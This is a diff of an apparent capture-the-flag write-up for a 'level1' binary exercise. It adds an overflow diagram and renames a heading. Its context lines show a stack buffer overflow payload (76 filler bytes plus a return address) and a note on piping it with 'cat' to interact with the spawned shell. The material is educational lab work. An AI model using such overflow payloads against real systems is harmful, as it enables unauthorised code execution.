@@ -177,7 +177,11 @@ With that we can create the payload:
 python -c "print 'A' * 76 + '\x72\x84\x04\x08'"
 ```
 
-## 4. Execute The Exploit - Capture The Flag
+### Overflow Visualization
+
+![img](Ressources/level1-overflow.png)
+
+## 4. Capture The Flag
 
 **Note:**  
 We use `cat /tmp/payload -` to send the payload and then keep `stdin` open. The dash (`-`) tells `cat` to continue reading from stdin, allowing us to interact with the spawned shell.
